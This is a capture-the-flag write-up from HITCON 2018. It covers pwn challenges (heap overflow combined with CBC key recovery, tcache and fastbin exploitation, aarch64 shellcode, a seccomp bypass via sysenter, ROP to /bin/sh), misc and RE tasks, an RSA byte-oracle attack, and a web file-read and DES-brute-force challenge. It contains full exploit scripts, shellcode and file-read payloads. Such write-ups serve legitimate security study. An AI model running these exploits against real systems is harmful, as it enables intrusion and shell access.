r = telnetlib.Telnet('52.194.203.194', 21700)
# r = telnetlib.Telnet('127.0.0.1', 20974)
rline = lambda: r.read_until(b'\n')[:-1]
tohex = lambda x: codecs.encode(x, 'hex')
fromhex = lambda x: codecs.decode(x, 'hex')
xor = lambda a, b: bytes(ai ^ bi for ai, bi in zip(a, b))

def rawenc(s):
    r.write(b'1\n') # Add note
    r.write(b'3\n') # index
    r.write(b'1\n') # Type
    r.write(f'{len(s)}\n'.encode('ascii')) # size
    r.write(s)
    r.write(b'2\n') # Show note
    r.write(b'3\n') # index
    r.read_until(b'index:')
    r.read_until(b'index:')
    res = None
    try:
        l = rline()
        res = codecs.decode(l, 'hex')
    except:
        print(l)
        raise
    r.write(b'3\n') # Remove note
    r.write(b'3\n') # index
    r.read_until(b'index:')
    return res

enciv = rawenc(b'\0' * 17)[:16]

def enc(s):
    s = b'\0' * 16 + xor(enciv, s[:16]) + s[16:]
    return rawenc(s)[16:]

i = 1
arr = []
with open('o.pkl', 'rb') as f:
    arr = pickle.load(f)
for i in trange(len(arr), 300):
    plain = i.to_bytes(16, 'big')
    plain += b'\x10' * 16 + b'\x10'
    overflow = enc(plain)[:32][-4:]
    arr.append(tohex(overflow).decode('ascii'))
    with open('o.pkl', 'wb') as f:
        pickle.dump(arr, f)
# for i in trange(0, 300, desc='checking'):
    # plain = i.to_bytes(16, 'big')
    # plain += b'\x10' * 16 + b'\x10'
    # overflow = enc(plain)[:32][-4:]
    # assert(arr[i] == tohex(overflow).decode('ascii'))
print(arr)
# r.interact()

```
* Get flag

```python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
from Crypto.Cipher import AES
import pickle

#f = open('pickle', 'wb')
a = []
r = remote('52.194.203.194', 21700)

def add(idx, typ, sz, data):
    r.sendlineafter('exit', '1')
    r.sendlineafter('index:', str(idx))
    r.sendlineafter('type:', str(typ))
    r.sendlineafter('size:', str(sz))
    r.sendafter('Note:', data)

def show(idx):
    r.sendlineafter('exit', '2')
    r.sendlineafter('index:', str(idx))
    return r.recvline()

def delete(idx):
    r.sendlineafter('exit', '3')
    r.sendlineafter('index:', str(idx))

add(2, 1, 0x11, '\x00'*0x11)
x = show(2)
blocks = [0]*4
for i in range(2):
    blocks[i] = int(x[32*i:32*(i+1)], 16)
    print '%x' % blocks[i]

#key = '1111111111111111'
key = '$#@!zxcvasdfqwer'
iv = ('%032x' % blocks[0]).decode('hex')
aes_iv = AES.new(key, AES.MODE_CBC, '\x00'*16)
iv = aes_iv.decrypt(iv)

print 'iv:', iv.encode('hex')
x = show(0).strip()
print x
aes = AES.new(key, AES.MODE_CBC, iv)
plain = aes.decrypt(x.decode('hex'))
print plain
#pickle.dump(a, f)

r.interactive()

# hitcon{*?!@_funny_c3ypt0_4nd_pwN__$$%#}

```

### Secret Note v2

#### Thought proccess

* In the second part of the challange, we have to get the shell.
* Since we now have the key, the overflowed content could be controlled as follows:
    * Leak `IV`, this could be done easily by decrypting a content of all zeros.
    * The overflowing block is always `AES.enc('\x10'*16 ^ last_block, key, IV)`
    * Say we want the encrypted content be `x`, we can controll `x` to arbitrary value by:
    ```
    last_block = x[-16:]
    rest = x[:-16]
    xx = AES.dec(last_block, key, IV) ^ '\x10'*16
    plain = AES.dec(rest || xx, key, IV)
    ```
This will lead us to:
#### Vulnerability
* 12 bytes controllable heap overflow.
#### Leak
* Overflow chunk size to create overlapped chunk.
* Double free to lauch fastbin dup attack.
* We don't have any address, but it's fine, just partial overwrite to a nearby `note` to change it's size to a big value.
* Show the corrupted size `note`, it can be controlled to contain `libc` and `heap` address.
#### Exploit
* With `libc` and `heap` address, there's nothing too fancy about the exploit thanks to `tcache` :)
#### Reflection

Personally, we think this is the best challange we've ever done (by kevin47 and sasdf). This challange was first opened by our team members who solve crypto. They discussed for a long time and couldn't find any cryptographic flaw. However, they did found the heap overflow vulnerability. After that, I entered this challange to see if the vulnerability can be exploited. But it was just impossible, the length and the content of the overflow both couldn't be controlled, so it will definitely mess up the next chunk size and the lower 4 bytes of fd.

Then it comes a funny situation.
* I claimed that it was impossible to pwn the binary without solving the crypto part.
* sasdf claimed that it was impossible to solve the crypto part without pwning.

So we were basically deadlocked XD.

It the end, it turns out that we were both right. We had to create a cryptographic flaw using the overflow, use the flaw to get the AES key and therefore we could pwn the binary. Thanks to HITCON for such an awesome challange!


#### Code

```python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
from Crypto.Cipher import AES
import pickle

context.arch = 'amd64'

r = remote('52.194.203.194', 21700)

def add(idx, typ, sz, data):
    r.sendlineafter('exit', '1')
    r.sendlineafter('index:', str(idx))
    r.sendlineafter('type:', str(typ))
    r.sendlineafter('size:', str(sz))
    r.sendafter('Note:', data)

def show(idx):
    r.sendlineafter('exit', '2')
    r.sendlineafter('index:', str(idx))
    return r.recvline()

def delete(idx):
    r.sendlineafter('exit', '3')
    r.sendlineafter('index:', str(idx))

add(2, 1, 0x11, '\x00'*0x11)
x = show(2)
blocks = [0]*4
for i in range(2):
    blocks[i] = int(x[32*i:32*(i+1)], 16)
    #print '%x' % blocks[i]

# leak iv
#key = '1111111111111111'
key = '$#@!zxcvasdfqwer'
iv = ('%032x' % blocks[0]).decode('hex')
aes_iv = AES.new(key, AES.MODE_CBC, '\x00'*16)
iv = aes_iv.decrypt(iv)
print 'iv:', iv.encode('hex')

def ciphertext2plain(cipher):
    global key, iv
    last = cipher[-16:]
    aes = AES.new(key, AES.MODE_CBC, '\x00'*16)
    l_d = aes.decrypt(last)
    l_num = int(l_d.encode('hex'), 16)
    #print hex(l_num)
    l_num ^= 0x10101010101010101010101010101010
    #print hex(l_num)
    prev_cipher = ('%032x' % l_num).decode('hex')

    aes = AES.new(key, AES.MODE_CBC, iv)
    return aes.decrypt(cipher[:-16]+prev_cipher)

def pad(plain):
    l = len(plain)%16
    l = 16-l
    return plain+chr(l)*l

def encrypt(plain):
    global key, iv
    aes = AES.new(key, AES.MODE_CBC, iv)
    return aes.encrypt(pad(plain))[16:]

def decrypt(cipher):
    global key, iv
    aes = AES.new(key, AES.MODE_CBC, iv)
    return aes.decrypt(cipher)

# fill 0x30 tcache
add(3, 1, 15, 'a'*15)
for i in range(7):
    show(2)

# overlapped chunk by overflow
add(4, 1, 0x4f, 'a'*0x4f)
add(5, 1, 0x5f, 'a'*0x5f)
for i in range(7):
    show(5)
for i in range(10):
    show(4)
for i in range(6, 8):
    add(i, 1, 0x5f, 'a'*0x5f)

# overflow payload
x = ciphertext2plain('\x00'*4+flat(0, 0, 0x451, 0)[:-4])
print x.encode('hex')
xx = encrypt(x)
print xx.encode('hex')
add(17, 1, 0x20, x)
# 4's size overwritten to 0x681
show(17)
delete(4)

show(5)
add(8, 1, 0x5f, 'a'*0x30+flat(0, 0x71)+'a'*0x1f)
add(9, 1, 0x5f, 'a'*0x5f)
add(10, 1, 0x5f, 'a'*0x5f)
add(11, 1, 0x5f, '/bin/sh\x00'.ljust(0x5f))
add(12, 1, 0x5f, 'a'*0x5f)
add(13, 1, 0x5f, 'a'*0x30+flat(0, 0x71)+'a'*0x1f)
add(14, 1, 0x5f, 'a'*0x5f)
# 5 == 13, 12 == 14

# leak heap & libc
delete(10)
delete(12)
delete(14)
add(10, 1, 1, '\x90')
add(12, 1, 1, '\x00')
add(14, 1, 0x38, flat(0, 0, 0, 0, 0, 0, 0x000000010000030f))
x = show(13).strip()
x = decrypt(x.decode('hex'))
heap = u64(x[14*8:15*8])
libc = u64(x[28*8:29*8]) - 0x3ebf90
print 'heap:', hex(heap)
print 'libc:', hex(libc)
'''
print len(x), x
for i in range(33):
    heap = u64(x[i*8:(i+1)*8])
    print i, hex(heap)
'''

# pwn
hook = libc + 0x3ed8e8
#system = libc + 0x4f440
system = libc + 0x10a38c
delete(5)
delete(13)
add(16, 1, 0x8, flat(hook))
add(18, 1, 0x8, flat(hook))
add(13, 1, 0x8, flat(system))
#raw_input("@")
delete(11)
'''
0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

# hitcon{overflow_with_CBC_and_why_calloc_doesnt_use_tcache??}

r.interactive()

```



### Super Hexagon

I only passed the first and the second level of this challenge.

#### EL0

##### Observation

First, we have bios.bin. bios.bin can be divided into several parts which contain the codes of different levels.

You can find an ELF binary appended to bios.bin. Then you can reverse it.

The binary contains the code of EL0 level.

##### exploit
1. There is a `print_flag` function at 0x400104.
2. Customized scanf with gets can trigger overflow.
3. Just overwrite the function pointer and print flag.


```python=
from pwn import *


r=remote("52.195.11.111",6666)

r.recvuntil("cmd> ")
r.sendline("0")
r.recvuntil("index: ")
r.sendline("a"*0x100+p64(0x400104))

r.interactive()

```

#### EL1

##### Observation

In gdb, if you step in svc instruction, you'll get into supervisor level which is EL1 level.

The code base is 0xffffffffc0000000. And you can find the code of EL1 level in bios.bin at 0xB0000

##### exploit

1. There is also a print_flag function in EL1 level. It's located at 0xffffffffc0008408.
2. You can leverage mprotect to make good use of shellcode.
3. Fortunately, there is no ASLR. We can find out that the return address of the function that handles syscall is stored at a fixed address which is 0xffffffffc0019bb9
4. Trigger read like this, `read(0,0xffffffffc0019bb8,1)`, can overwrite the return address then control the control flow in EL1 level.
5. However, we can only overwrite one byte. The original return address is 0xffffffffc000a830. We cannot change it to 0xffffffffc0008408.
6. After a while, I found an useful gadget at 0xffffffffc0008f30 which will return again. And the return address is located at 0xffffffffc0019c08.
7. First, put the print_flag address at 0xffffffffc0019c08. Then trigger `read(0,0xffffffffc0019bb9,1)` so as to replace return address 0xffffffffc000a830 with 0xffffffffc0008f30.


```python=
from pwn import *

context.arch = 'aarch64'
r = remote('52.195.11.111',6666)

load_key = 0x4002f4
buf = 0x00007ffeffffd000
mprotect = 0x401b68

payload='''
MOV x0,x2;
MOV x19,x2;
MOV x1,0x9c08;
add x1,x1,x19;
MOVK            X1, #0xc001,LSL#16;
MOVK            X1, #0xffff,LSL#32;
MOVK            X1, #0xffff,LSL#48;
MOV             X2, 1;
MOV             X8, #0x3f;
SVC             0;
cmp x19,#7
b.eq 0xc
add x19,x19,1
b 0xffffffffffffffd4
MOV x0,x2;
MOV x1,0x9bb9;
MOVK            X1, #0xc001,LSL#16;
MOVK            X1, #0xffff,LSL#32;
MOVK            X1, #0xffff,LSL#48;
MOV             X2, 2;
SVC             0;
'''


shellcode=asm(payload)
def cmd(c, idx, key=''):
    r.sendlineafter('cmd> ', str(c))
    r.sendlineafter('index: ', str(idx))
    if c != 0:
        r.sendlineafter('key: ', key)
k=shellcode.split("\x00")

cc=0
for i in k[::-1]:
  print "HAH",i.encode("hex")
  cmd(1, 1, ('a'*(16+len(shellcode)-len(i)-cc)+i).ljust(0x100,"\x00")+flat(0x1234,0x40051C))
  cc+=len(i)+1
cmd(0, 'a'.ljust(0x100)+flat(0x400634,0x40051C))
cmd(1, 4096, 'aaaaa'.ljust(0x100)+flat(load_key, mprotect))
cmd(0, 'a'.ljust(0x100)+flat(buf+0x10))

r.send(p64(0xffffffffc0008408)+"\x8f")


r.interactive()

```

## Misc

### EV3 Basic
1. Extract the data from pklg

```
0d002a000000008412008413000000
08002a00000000840080
11002a000000008405010a8128846800840080
11002a00000000840501148128846900840080
12002a0000000084050181648152847d00840080
12002a0000000084050181468128847b00840080
12002a00000000840501815a8128843100840080
12002a00000000840501813c8128846e00840080
13002a00000000840501828c008144846500840080
12002a0000000084050181288128846300840080
12002a00000000840501816e8128846400840080
12002a0000000084050181328128846f00840080
11002a000000008405011e8128847400840080
13002a0000000084050182a0008136846100840080
13002a000000008405018296008144847600840080
12002a0000000084050181508128846d00840080
12002a0000000084050181788136846900840080
13002a000000008405018282008144846400840080
12002a0000000084050181288152846500840080
12002a0000000084050181468152846b00840080
11002a000000008405011e8144845f00840080
12002a00000000840501813c8144847200840080
12002a0000000084050181288144846600840080
12002a00000000840501815a8144846100840080
12002a00000000840501813c8136847500840080
11002a00000000840501148152846f00840080
12002a0000000084050181648136846100840080
12002a0000000084050181328144846900840080
12002a0000000084050181788128843500840080
12002a0000000084050181648128846e00840080
12002a00000000840501815a8152847400840080
12002a0000000084050181788144845f00840080
12002a0000000084050181648144847200840080
11002a000000008405010a8136845f00840080
12002a0000000084050181468136846e00840080
13002a0000000084050182a0008144846500840080
13002a000000008405018296008128847200840080
13002a000000008405018282008136846f00840080
13002a0000000084050182a0008128846d00840080
13002a00000000840501828c008128843000840080
12002a0000000084050181508152846900840080
11002a000000008405011e8152847000840080
12002a0000000084050181328136846d00840080
12002a0000000084050181288136846d00840080
12002a00000000840501815a8136846300840080
11002a00000000840501148136846300840080
11002a000000008405010a8144846e00840080
12002a0000000084050181468144846d00840080
13002a000000008405018296008136845f00840080
13002a000000008405018282008128847400840080
12002a00000000840501816e8136847400840080
11002a00000000840501148144846400840080
12002a0000000084050181508136846900840080
12002a00000000840501813c8152845f00840080
12002a0000000084050181508144847700840080
13002a00000000840501828c008136846e00840080
12002a0000000084050181328152847200840080
11002a000000008405011e8136846f00840080
11002a000000008405010a8152846c00840080
12002a00000000840501816e8144846500840080

```

2. Get the useful data

```
1 0a8128 68
1 148128 69
2 81648152 7d
2 81468128 7b
2 815a8128 31
2 813c8128 6e
3 828c008144 65
2 81288128 63
2 816e8128 64
2 81328128 6f
1 1e8128 74
3 82a0008136 61
3 8296008144 76
2 81508128 6d
2 81788136 69
3 8282008144 64
2 81288152 65
2 81468152 6b
1 1e8144 5f
2 813c8144 72
2 81288144 66
2 815a8144 61
2 813c8136 75
1 148152 6f
2 81648136 61
2 81328144 69
2 81788128 35
2 81648128 6e
2 815a8152 74
2 81788144 5f
2 81648144 72
1 0a8136 5f
2 81468136 6e
3 82a0008144 65
3 8296008128 72
3 8282008136 6f
3 82a0008128 6d
3 828c008128 30
2 81508152 69
1 1e8152 70
2 81328136 6d
2 81288136 6d
2 815a8136 63
1 148136 63
1 0a8144 6e
2 81468144 6d
3 8296008136 5f
3 8282008128 74
2 816e8136 74
1 148144 64
2 81508136 69
2 813c8152 5f
2 81508144 77
3 828c008136 6e
2 81328152 72
1 1e8136 6f
1 0a8152 6c
2 816e8144 65

```

3. Sort with some order


```
1 0a8128 68
1 148128 69
1 1e8128 74
2 81288128 63
2 81328128 6f
2 813c8128 6e
2 81468128 7b
2 81508128 6d
2 815a8128 31
2 81648128 6e
2 816e8128 64
2 81788128 35
3 8282008128 74
3 828c008128 30
3 8296008128 72
3 82a0008128 6d

1 0a8136 5f
1 148136 63
1 1e8136 6f
2 81288136 6d
2 81328136 6d
2 813c8136 75
2 81468136 6e
2 81508136 69
2 815a8136 63
2 81648136 61
2 816e8136 74
2 81788136 69
3 8282008136 6f
3 828c008136 6e
3 8296008136 5f
3 82a0008136 61

1 0a8144 6e
1 148144 64
1 1e8144 5f
2 81288144 66
2 81328144 69
2 813c8144 72
2 81468144 6d
2 81508144 77
2 815a8144 61
2 81648144 72
2 816e8144 65
2 81788144 5f
3 8282008144 64
3 828c008144 65
3 8296008144 76
3 82a0008144 65

1 0a8152 6c
1 148152 6f
1 1e8152 70
2 81288152 65
2 81328152 72
2 813c8152 5f
2 81468152 6b
2 81508152 69
2 815a8152 74
2 81648152 7d

```

4. The last two char is the hex of flag


```
hitcon{m1nd5t0rm_communication_and_firmware_developer_kit}

```

### EV3 Scanner

1. Get the data from pklg


```
tshark -r ev3_scanner_record.pklg -E separator=, -e data -T fields data > raw

```

2. Replace some useless text.

3. Replace `07002a00020000c040` to 0.
4. Replace `07002a00020000803f` to 1.
5. Replace `07002a000200008040` to 2.
6. Replace `07002a000200000040` to 3.
7. You will get something like this

```
22001300000000000000000000000000000000000000000000001110002111111000100000000130011111120011111110001000001004111111000111111130011111100010000010001111110001000010001111110021111
2000000002100000000000130001300130000000100010000013000000013001000041000100004300210001300000000010001000000001000000041000000001100000130000000000000000000000000000001000001000000004100222
2200100000000000001111100000000000000000000000000000410000011000000001100000013000000004100130000000002100100001000011000100000100210000000010000010001000000001311000001000000000001300000000
2000000211100000211111100000011100000001100010000210001111110012000010001111111000001100000411300100011111130000100000100000111111300000110002111110211111100011110000021133000000000000100222
2222001300000000000000000000000000000000000000000000001111000111111100410000000210001111113001111111000130000130011111130011111113001111110001000001000111111000130001300111111300111110000000
2000000110000000000130001100130000000130041000021000000001001000001300410000100010004100000000010041000000001200000011000000004100000110000000000000000000000000000001100001100000000120222222
2222001300000000000011111000000000000000000000000000001300000100000000021000001100000000010001000000000001013000010000430021000041001000000001300001000120000000121000000100000000000100000000
2000001110000001111110000001110000000410001000021000111111004300004100011111130000212000001110021001111111000041000010000011111130000011100413411041111110001111000000010000410001111111022222
2022001300011000100000100000001000000130001041002100001300000100000000002100012000000000013001000001300000100000120010000010000010000000210041000041000100000000102130000000001000000110000000
2000000110000001000000001100010000000010001000001000130000000100000100041000410000010000001000041004100000000000410100000000000010000001000011001104300013000001000000041000013000130001102222
2222041000210001100001110000041111300111111011001300001110000111111300000011200000001111110041111113000004300000100004100111111110011111130011111111002111111002100002100111111001111100000000
2000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002

```
8. Reverse the even line, and replace some useless link and symbol.

```
_______##______________________________________________###____######___#________##__######___#######___#_____#__#######___########__######___#_____#___######___#____#___######___####
_______##________#_____#______________________________##_____##________##_______#________#___#_________##___#___##____#___##____#__##_______##_____#___#_______##__##___##___________#__________
______#_____________#####_____________________________##_____##________##______##________##__##__________#__#____#____##___#_____#___#________#_____#___#________####_____#___________##________
______#######___##____#_______####___#######_######__###_____#######_____#____##____#######__#___###______#_____#######___##____##__######___#_____#___##_______###______######______###______
______##___##___#_____#_______#______##___#_##___#____##_____#___________#___#___________##__#_____##_____#_____#___#_____#_____#________#__##____##___#________#__##_________#______##_______
_____##___##___##____##_______#_____##___##_##__##____#______#____________#_##___________##__##____#______#_____##___##___#_____#_______##___#_____#___#________#___##________#______##_______
_____##____#___##____###_____######__######_##__##____###____#######______##________######__########_____##_____#____##__########__#######__########___######___#_____#__######__#####________
______________________________________________________________________________________________________________________________________________________________________________________________

```
9. And the Flag is `hitcon{EV3GYROSUCKS}`

### Baldis-RE-Basics

In this challenge, we have to do **assemble, disassemble, and emulate** for 8 kinds of architecture

Here is the list of packages I used to solve this challenge

| architecture | assemble | disassemble | emulate |
| --- | --- | --- | --- |
| i386 | pwntools | capstone | unicorn |
| amd64 | pwntools | capstone | unicorn |
| arm | pwntools | capstone | unicorn |
| aarch64 | pwntools | capstone | unicorn |
| mips | keystone | capstone | unicorn |
| powerpc | pwntools | capstone | pwntools.run_shellcode ( qemu ) |
| risc-v | pwntools-patch | pwntools-patch | pwntools-patch.run_shellcode ( [spike](https://github.com/riscv/riscv-isa-sim) ) |
| wasm | wabt/wat2wasm | [wasm](https://github.com/athre0z/wasm) | wabt/wasm-interp |

There are 7 rooms at the beginning

Every room will contain a random architecture to solve

After solving 7 rooms, the hidden architecture **wasm** will come up = =

![](https://i.imgur.com/QaXisdl.png)

#### install

First, we need to install lots of package

binutils for different architecture


```
apt-get install binutils-powerpc-linux-gnu \\
                binutils-aarch64-linux-gnu \\
                binutils-mips-linux-gnu \\
                binutils-arm-linux-gnueabi

```

[keystone](http://www.keystone-engine.org/) to assemble

[capstone](http://www.capstone-engine.org/) to disassemble

[unicorn](https://www.unicorn-engine.org/) to emulate

also the mighty **pwntools** which can do everything

[riscv-tools](https://github.com/riscv/riscv-tools) for risc-v architecture ( compile this need lots of time, remember to set multithread flag `-j8` )

[wabt](https://github.com/WebAssembly/wabt) for wasm architecture

#### assemble

For assemble, we need to **assemble** assembly code to machine code

**pwntools** is enough for most architecture

However, pwntools `asm` for **mips** didn't get the right answer. Use keystone instead

#### disassemble

For disassemble, we need to **disassemble** machine code to assembly code

At first, I also use **pwntools** for disassemble, and use regex replace to fix the format

Then, one of my teammate realize that the server use **capstone** to do disassemble

#### emulate

For emulate, the server will give us a **function**, and we need to determine the right answer for the **return value** after the function is executed.

**unicorn** is easy to use, because it can read a register out directly from script

**unicorn** did not support powerpc, so we use **pwntools** `run_shellcode` function, which actually use qemu, to emulate shellcode for us

`run_shellcode` only give us **exit code** ( 1 byte ), I leak the return value through **exit code** and shift 8 four times to get the whole 32 bits answer.

#### risc-v

**keystone**, **capstone**, **unicorn** and **pwntools** all did not support risc-v, so I patch **pwntools** `pwnlib/context/__init__.py`, `pwnlib/asm.py`, and `pwnlib/tubes/process.py` and use **pwntools** to do `asm`, `disasm`, and `run_shellcode`

Because **pwntools** actually use the binutils tools and qemu to do `asm` and `disasm` and `run_shellcode` for us

`binutils-riscv64-linux-gnu` exists and also `spike` can replace qemu

All we need to do is add some constant in **pwntools** and it will works perfectly.

For emulate, I use the same trick to get the return value through **exit code**

Notice that there is a infinite loop in the shellcode ( ~~maybe some kind of joke from the challenge maker ?~~ it's generated by the risc-v compiler for unknown reason ? )

`f0: 0000006f j 0xf0`

We need to strip the shellcode after this line to finish execution

#### wasm

And finally, after 7 architectures ( and get half of the flag ) is the final hidden architecture

We use [wabt](https://github.com/WebAssembly/wabt) tools

For emulate, I wrap the disassembled shellcode inside a function and re-assemble it back to wasm and use `wasm-interp` to emulate


```
(module
  (export "square" (func $square))
  (func $square (param) (result i32)
    shellcode...
  )
)

```

flag : `hitcon{U_R_D4_MA5T3R_0F_R3_AND_PPC_!#3}`
source code : https://github.com/OAlienO/CTF/tree/master/2018/HITCON-CTF/Baldis-RE-Basics

### 32 world

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer >> 32
 0001: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW

```
* Use `sysenter` to bypass seccomp rules constraint.

```python
#!/usr/bin/env python
from pwn import *

# hitcon{s3cc0mp_1s_n0t_4lw4y_s4f3_LOL}

host , port = '54.65.133.244' , 8361
y = remote( host , port )

p = asm('''
	push 0x68732f
	push 0x6e69622f
	mov ebx, esp
	mov al, 0xb
	mov ebp, esp
	sysenter
''')

y.sendafter( ':' , p )
y.interactive()

```

### tooooo

Just like the challenge [HITCON-CTF-2017 two](https://ctftime.org/task/4841), but this time in aarch64.

Every register is random value. We need to findout two gadget in libc in order to get shell.

First, I aimed for `/bin/sh`, and I found that only the gadget at 0x63E8c is acceptable. The others need to clean too much registers.

0x63E8c
![](https://i.imgur.com/wQGcal3.png)

Then, we just need to find another gadget to clean register x1. Then I found one gadget at 0xE61B0

0xE61B0
![](https://i.imgur.com/fJvJwbi.png)


With these two gadgets, we can get shell.


```python=
from pwn import *
r=remote("13.230.48.252", 4869)

stdout=0x154560
r.recvuntil("0x")
lib=r.recvline()
lib=int(lib,16)-stdout
log.info(hex(lib)) # get libc address

r.send("a"*0x20+p64(lib+0xE61B0)+p64(lib+0x63E8c))

r.sendline("cat /home/tooooo/flag")
r.interactive()

```



## Crypto

### Lost Modulus

[https://sasdf.cf/ctf-tasks-writeup/writeup/2018/hitcon/crypto/lostmod/](https://sasdf.cf/ctf-tasks-writeup/writeup/2018/hitcon/crypto/lostmod/)

### Lost-Key

This challenge is a RSA cryptosystem

We have encryption and decryption oracles as in `Lost-Modulus` challenge

But the decryption only give us the last byte

It's looks like a classic `LSB Oracle Attack`, but with unknown `n` and `e`

#### leak n

`n = gcd(enc(2) ** 2 - enc(2 ** 2), enc(3) ** 2 - enc(3 ** 2))`

#### leak e

Actually we don't need to leak `e`

leak `enc(256) = 256 ** e % n` will be enough

#### Least Significant **Byte** Oracle Attack

Let's recall Least Significant **Bit** Oracle Attack first

1. Send $c_1 = 2^ec_0$ and get $(2m \text{ mod } n ) \text{ mod } 2 = x$

2. Use $x$ to reduce the possible range $m$ might be in

3. repeat 1, 2 again by sending $c_2 = 2^ec_1$

$m \in [0, \frac{n}{2}) \to 2m \in [0, n) \to 2m \text{ mod } n = 2m \to x = 0$

$m \in [\frac{n}{2}, n) \to 2m \in [n, 2n) \to 2m \text{ mod } n = 2m - n \to x = 1$

In each oracle, the above process reduce the possible range of $m$ by half, so the time complexity will be $log(n)$

In this challenge, $log(n) = 1024$ but we only have 150 chances

Let's introduce Least Significant **Byte** Oracle Attack

Generally, we replace the $2$ in the original LSB with $2^8 = 256$

1. Send $c_1 = 256^ec_0$ and get $(256m \text{ mod } n ) \text{ mod } 256 = x$

2. Use $x$ to reduce the possible range $m$ might be in

3. repeat 1, 2 again by sending $c_2 = 256^ec_1$

$m \in [\frac{in}{256}, \frac{(i+1)n}{256})$

$256m \in [in, (i+1)n) $

$256m \text{ mod } n = 256m - in $

$x = -in \text{ mod } 256 $

$i = -x n^{-1} \text{ mod } 256$

Brute force every possible $n \text{ mod } 256 = 1, 3, \cdots, 255$ and find for `hitcon` string

Time complexity is $log_{256}(n) = \frac{log(n)}{8} = 128$

flag : `hitcon{1east_4ign1f1cant_BYTE_0racle_is_m0re_pow3rfu1!}`
source code : https://github.com/OAlienO/CTF/tree/master/2018/HITCON-CTF/Lost-Key

## Web

### Oh My Raddit

The page has lots of different link with hyperlink format of `http://13.115.255.46/?s=xxxx`. By observation, we have found that all the `xxxx` has largest common factor of 16. Besides, the download links has the same prefix with len 16 and the filter of 10 and 100 shares prefix. 16 bytes hex is actually 8 raw bytes. Concluding the observation above, we guess it's a DES cipher. However, in the real world it takes a day long for a ASIC DES chips to brute force the private key. Thanks to the hint `assert ENCRYPTION_KEY.islower()` and the fact that low bit doesn't matter in DES, the search space could be $(\frac{26}{2})^8$. By the script in [link](http://mslc.ctf.su/wp/hack-lu-2012-ctf-challenge-17-400/) and the plaintext ciphertext pair `(bilities,aee2b8b4568118b5)`, we get a possible key. Due to the low bit (parity bit) trick, there are 128 keys. Submit all of them (manually), then we get the flag `hitcon{megnnaro}`.

Note 1:
The hint `assert ENCRYPTION_KEY.islower()` is confusing. If a string contains at least one lowercase character and no uppercase character, `islower()` returns True.


```python
>>> '*b~71#_)'.islower()
True

```

Note 2:
orange (author) on IRC:
`sudo hashcat -a 3 -m 14000 '3ca92540eb2d0a42:0808080808080808' -1 DESALL.txt --hex-charset ?1?1?1?1?1?1?1?1 -n 4 --force --potfile-disable`
break in 1 sec XD
The DESALL.txt contains the hex of acegikmoqsuwyz

Note 3:
We accidently observed that PPP solved this problem **while this challenge is still offline** (the challenge is down but  Orange went to sleep XD). This probably implies that we can solve the problem totally in offline. That's why we quickly turn to brute force the DES key.

### Oh My Raddit v2

We should get shell in order to retrieve the flag in Oh My raddit 2.

#### Arbitrary File Read

Since we have the DES key now, we can first decrypt the ciphertext of the download command:

```
m=d&f=uploads%2F70c97cc1-079f-4d01-8798-f36925ec1fd7.pdf

```

Let's try specifying the path now. Does it work? Yes, it works!

```
m=d&f=app.py

```

Read the following files:

- app.py: source code
- db.db: but nothing interesting in the database
- /proc/self/environ: the full path of app.py is /home/orange/w/app.py
- /proc/self/cmdline: python app.py
- /proc/self/maps: python 2.7
- /flag: Internal Server Error, which means the file exists but cannot be read
- requirements.txt: `pycrypto==2.6.1`, `web.py==0.38` (web.py is outdated)

Here is the source code of `app.py`:


```python
# coding: UTF-8
import os
import web
import urllib
import urlparse
from Crypto.Cipher import DES

web.config.debug = False
ENCRPYTION_KEY = 'megnnaro'


urls = (
    '/', 'index'
)
app = web.application(urls, globals())
db = web.database(dbn='sqlite', db='db.db')


def encrypt(s):
    length = DES.block_size - (len(s) % DES.block_size)
    s = s + chr(length)*length

    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)
    return cipher.encrypt(s).encode('hex')

def decrypt(s):
    try:
        data = s.decode('hex')
        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)

        data = cipher.decrypt(data)
        data = data[:-ord(data[-1])]
        return dict(urlparse.parse_qsl(data))
    except Exception as e:
        print e.message
        return {}

def get_posts(limit=None):
    records = []
    for i in db.select('posts', limit=limit, order='ups desc'):
        tmp = {
            'm': 'r', 
            't': i.title.encode('utf-8', 'ignore'), 
            'u': i.id, 
        } 
        tmp['param'] = encrypt(urllib.urlencode(tmp))
        tmp['ups'] = i.ups
        if i.file:
            tmp['file'] = encrypt(urllib.urlencode({'m': 'd', 'f': i.file}))
        else:
            tmp['file'] = ''
        
        records.append( tmp )
    return records

def get_urls():
    urls = []
    for i in [10, 100, 1000]:
        data = {
            'm': 'p', 
            'l': i
        }
        urls.append( encrypt(urllib.urlencode(data)) )
    return urls

class index:
    def GET(self):
        s = web.input().get('s')
        if not s:
            return web.template.frender('templates/index.html')(get_posts(), get_urls())
        else:
            s = decrypt(s)
            method = s.get('m', '')
            if method and method not in list('rdp'):
                return 'param error'
            if method == 'r':
                uid = s.get('u')
                record = db.select('posts', where='id=$id', vars={'id': uid}).first()
                if record:
                    raise web.seeother(record.url)
                else:
                    return 'not found'
            elif method == 'd':
                file = s.get('f')
                if not os.path.exists(file):
                    return 'not found'
                name = os.path.basename(file)
                web.header('Content-Disposition', 'attachment; filename=%s' % name)
                web.header('Content-Type', 'application/pdf')
                with open(file, 'rb') as fp:
                    data = fp.read()
                return data
            elif method == 'p':
                limit = s.get('l')
                return web.template.frender('templates/index.html')(get_posts(limit), get_urls())
            else:
                return web.template.frender('templates/index.html')(get_posts(), get_urls())


if __name__ == "__main__":
    app.run()

```

#### Browsing source code / issues

First I found [this issue](https://github.com/webpy/webpy/commit/becbfb92d7601ddb0aededfdc9a91696bde2430f#diff-bab5d2282d3362e44ff9cea603fb052f), and it's reported by Orange Tsai, who is the author of the challenge. Gotcha!

